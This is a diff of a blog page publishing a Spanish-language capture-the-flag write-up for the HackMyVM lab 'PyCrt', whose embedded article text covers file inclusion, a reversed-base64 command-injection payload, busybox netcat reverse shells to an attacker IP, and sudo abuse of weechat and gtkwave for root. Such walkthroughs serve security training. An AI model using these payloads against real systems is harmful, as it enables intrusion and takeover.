@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="dark">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>PyCrt | Hack Stark ×͜×</title>
 <meta name="keywords" content="LFI, RCE, IRC-Explotation, Sudo-Privilege, Xvfb, Gtkwave">
 <meta name="description" content="Writeup de la máquina PyCrt en HackMyVM.">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/writeups/hackmyvm/pycrt/">
+<link rel="canonical" href="https://hackstark.netlify.app/writeups/hackmyvm/pycrt/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://hackstark.netlify.app/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://hackstark.netlify.app/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://hackstark.netlify.app/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://hackstark.netlify.app/apple-touch-icon.png">
+<link rel="mask-icon" href="https://hackstark.netlify.app/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackmyvm/pycrt/">
+<link rel="alternate" hreflang="en" href="https://hackstark.netlify.app/writeups/hackmyvm/pycrt/">
 <noscript>
     <style>
         #theme-toggle,
@@ -38,24 +38,98 @@
 <link rel="apple-touch-icon" href="/images/logo.png">
 <link rel="shortcut icon" href="/images/logo.png">
 <meta name="theme-color" content="#2E3440">
+<meta property="og:url" content="https://hackstark.netlify.app/writeups/hackmyvm/pycrt/">
+  <meta property="og:site_name" content="Hack Stark ×͜×">
+  <meta property="og:title" content="PyCrt">
+  <meta property="og:description" content="Writeup de la máquina PyCrt en HackMyVM.">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-12-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-12-24T00:00:00+00:00">
+    <meta property="article:tag" content="LFI">
+    <meta property="article:tag" content="RCE">
+    <meta property="article:tag" content="IRC-Explotation">
+    <meta property="article:tag" content="Sudo-Privilege">
+    <meta property="article:tag" content="Xvfb">
+    <meta property="article:tag" content="Gtkwave">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PyCrt">
+<meta name="twitter:description" content="Writeup de la máquina PyCrt en HackMyVM.">
 
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://hackstark.netlify.app/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "",
+      "item": "https://hackstark.netlify.app/writeups/hackmyvm/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "PyCrt",
+      "item": "https://hackstark.netlify.app/writeups/hackmyvm/pycrt/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PyCrt",
+  "name": "PyCrt",
+  "description": "Writeup de la máquina PyCrt en HackMyVM.",
+  "keywords": [
+    "LFI", "RCE", "IRC-Explotation", "Sudo-Privilege", "Xvfb", "Gtkwave"
+  ],
+  "articleBody": "Enumeración Iniciemos identificando la máquina víctima con ayuda de Arp-Scan :\narp-scan -I ens33 --localnet --ignoredups Como podemos observar, la IP de la máquina víctima es 192.168.1.66.\nVamos a realizar un escaneo para identificar primero los puertos abiertos con ayuda de Nmap:\nnmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.66 -oG allPorts Como podemos observar tenemos los puertos 22,80,6667, con esto en mente vamos a realizar un segundo escaneo para obtener información de estos puertos en específico:\nnmap -p22,80,6667 -sVC 192.168.1.66 -oN target Como podemos observar tenemos servicios ssh, http y irc corriendo, vamos a comenzar a enumerar el puerto 80 mirando su contenido:\nPodemos ver que tenemos en sí la página por defecto de apache2.\nVamos a revisar mediante la herramienta de irssi la conexión por el puerto 6667 a ver que logramos encontrar:\nirssi Vemos algo de información y algo que llama nuestra atención en el banner es que nombra al directorio ShadowSec por lo que vamos a intentar ver si esto existe en la web:\nVemos la web, pero en realidad a más de esa información no tenemos nada, podemos intentar hacer un poco de fuzzing con Gobuster y buscar por archivos con extensión .php:\ngobuster dir -u http://192.168.1.66/ShadowSec -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php Como podemos observar tenemos un archivo llamado bydataset.php, vemos que hace:\nno vemos nada interesante, pero vamos a intentar ver como se está tramitando la petición con BurpSuite:\nExplotación La verdad es que no vemos nada del otro mundo y no tenemos información, algo que podemos intentar talvez es buscar por parámetros en la url, vamos a intentarlo con ayuda de Wfuzz:\nwfuzz -c --hw=4 -t 200 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \"http://192.168.1.66/ShadowSec/bydataset.php?FUZZ\" podemos observar que es diferente al usar file, veamos en BurpSuite que es lo que sale:\nvemos que nos dice un error de lectura del archivo, esto me llama la atención y podemos intuir un Local File Inclusion (LFI), vemos si es posible:\nperfecto, esto funciona, podemos intentar leer logs y más, pero no tenemos permisos, por lo que vamos a intentar leer el mismo archivo bydataset.php a ver si es posible:\nExcelente, vamos a analizar el código a ver que podemos hacer:\nVemos que recibe también información por POST, con los parámetros auth y payload.\nVemos que auth=LetMeIn123! y que luego se llama a una función decrypt y enviamos el payload.\nHasta este punto vamos a intentar con la información que tenemos para ver que obtenemos:\nBueno, algo pasa con el payload, veamos que hace la función decrypt: Vemos que la función primero pone la cadena en reversa, luego hace decode de base64, entonces hasta allí yo lo que haría es mandar una cadena en base64 reversa, para lograr que al entrar en la función la ponga normal y luego haga el decode de base64, ahora el objetivo es entrar en el tercer apartado para que no retorne el false donde al parecer busca cmd: en la cadena para entrar, entonces vamos a hacer lo siguiente primero para probar:\necho \"cmd:whoami\" | base64 | rev ahora eso vamos a enviarlo en payload a ver que logramos:\nVemos que se ejecuta el whoami, ya tenemos una forma de ejecutar comandos.\nYa con esto vamos a intentar entablar una Reverse Shell de la siguiente manera:\necho \"cmd:busybox nc 192.168.1.68 443 -e /bin/sh\" | base64 | rev ya con esto generamos la Reverse shell:\nnc -nlvp 443 Listo ya tenemos la Reverse Shell, vamos a darle tratamiento y comenzamos a enumerar:\nEscalada de Privilegios Podemos observar como tenemos permiso para ejecutar como chatlake el binario de weechat, vamos a ver que podemos hacer ya dentro:\nsudo -u chatlake /usr/bin/weechat algo que tenemos que saber es que mediante una conexión nosotros podemos ejecutar comandos con /exec , quedando de la siguiente manera:\nperfecto, lo que voy a hacer es generar otra reverse shell para poder quedar como el usuario chatlake ejecutando /exec busybox nc 192.168.1.68 444 -e /bin/sh:\nListo, volvemos a intentar dar un tratamiento y luego comenzamos a enumerar.\nEn este usuario encontramos la flag de usuario.\nComo observamos podemos iniciar un servicio sin necesidad de introducir contraseña, podemos hacerlo para ver que logramos.\nListo ahora el revisar, enumerar y buscar donde o que podemos aprovechar en este servicio es una opción, pero la verdad no encontré nada, con eso en mente lo que hice es volver a conectarme al IRC, para ver si algo cambio:\na comparación de la primera vez ahora tenemos 6 canales disponibles, en este caso nos conectamos a todos y enviamos mensajes esperando respuestas o algo:\npodemos observar que llega un mensaje que nos dice que al final de los mensajes mandemos un :), vamos a intentarlo en los diferentes chats a ver que logramos:\nse genera una nueva conversación donde vemos lo siguiente:\nveamos con números:\nvemos lo mismo, podemos intentar enviar mensajes en los diferentes chats a ver si en alguno el mensaje cambia:\nVemos que en el canal 2 cambia el mensaje y vemos que dice que la ejecución del comando no se permitió.\nSi recordamos, teníamos una web con información donde tenemos operative: ll104567, podemos intentar cambiar el nick a ese valor para ver que logramos, para esto hacemos un /nick ll104567:\nperfecto ahora volvemos a intentar con el mensaje del numero a ver que sucede:\nvemos lo mismo, intentamos con las demás salas a ver si alguna cambia:\nPodemos observar que al enviarlo desde el chan1 logramos ver una A, esto es algo extraño, pero y si intentamos enviar letras en formato ascii:\nintentemos con la d en format decimal que sería el 100:\nEsto funciona, enviemos combinaciones simples como id a ver si se ejecuta 105 100:):\nvemos que sigue sin ser autorizado, pero vamos a intentar con diferentes comandos y para automatizar el proceso de pasar los valores a decimal se utilizara el siguiente script:\nimport sys def main(): command=sys.argv[1] command_decimal = '' for char in command: command_decimal += str(ord(char)) + \" \" print(f\"comand: {command_decimal}:)\") if __name__ == '__main__': main() listo con esto ya podemos volver a generar una Reverse Shell para estar como el usuario pycrtlake:\nListo, ahora le damos tratamiento y comenzamos a enumerar.\nVemos que podemos ejecutar gtkwave como root.\nNosotros mediante gtkwave podemos inicializar una consola interactiva TCL, el problema es que para esto necesitamos GUI pero al no tenerla esto fallara.\nVamos a emular un Display con ayuda de Xvfb de la siguiente manera:\nXvfb :1 \u0026 Ya con esto usaremos gtkwave donde con el parámetro -W e indicando el Display a usar que será el 1 vamos a ejecutarlo de la siguiente manera:\nsudo DISPLAY=:1 /usr/bin/gtkwave -W Tenemos la consola interactiva como root.\nYa podemos ver la flag:\nLab Terminado. ",
+  "wordCount" : "1114",
+  "inLanguage": "en",
+  "datePublished": "2025-12-24T00:00:00Z",
+  "dateModified": "2025-12-24T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://hackstark.netlify.app/writeups/hackmyvm/pycrt/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hack Stark ×͜×",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://hackstark.netlify.app/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Hack Stark ×͜× (Alt + H)">Hack Stark ×͜×</a>
+            <a href="https://hackstark.netlify.app/" accesskey="h" title="Hack Stark ×͜× (Alt + H)">Hack Stark ×͜×</a>
             <div class="logo-switches">
             </div>
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/" title="Home">
+                <a href="https://hackstark.netlify.app/" title="Home">
                     <span>Home</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/writeups/" title="WriteUps">
+                <a href="https://hackstark.netlify.app/writeups/" title="WriteUps">
                     <span>WriteUps</span>
                 </a>
             </li>
@@ -84,12 +158,12 @@
 
       <br />
       <ul class="post-tags">
-        <li><a href="http://localhost:1313/tags/lfi/">LFI</a></li>
-        <li><a href="http://localhost:1313/tags/rce/">RCE</a></li>
-        <li><a href="http://localhost:1313/tags/irc-explotation/">IRC-Explotation</a></li>
-        <li><a href="http://localhost:1313/tags/sudo-privilege/">Sudo-Privilege</a></li>
-        <li><a href="http://localhost:1313/tags/xvfb/">Xvfb</a></li>
-        <li><a href="http://localhost:1313/tags/gtkwave/">Gtkwave</a></li>
+        <li><a href="https://hackstark.netlify.app/tags/lfi/">LFI</a></li>
+        <li><a href="https://hackstark.netlify.app/tags/rce/">RCE</a></li>
+        <li><a href="https://hackstark.netlify.app/tags/irc-explotation/">IRC-Explotation</a></li>
+        <li><a href="https://hackstark.netlify.app/tags/sudo-privilege/">Sudo-Privilege</a></li>
+        <li><a href="https://hackstark.netlify.app/tags/xvfb/">Xvfb</a></li>
+        <li><a href="https://hackstark.netlify.app/tags/gtkwave/">Gtkwave</a></li>
       </ul>
     </header> 
     <div class="post-content"><h1 id="enumeración">Enumeración<a hidden class="anchor" aria-hidden="true" href="#enumeración">#</a></h1>
@@ -406,7 +480,7 @@
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/">Hack Stark ×͜×</a></span> · 
+        <span>&copy; 2026 <a href="https://hackstark.netlify.app/">Hack Stark ×͜×</a></span> · 
 
     <span>
         Powered by
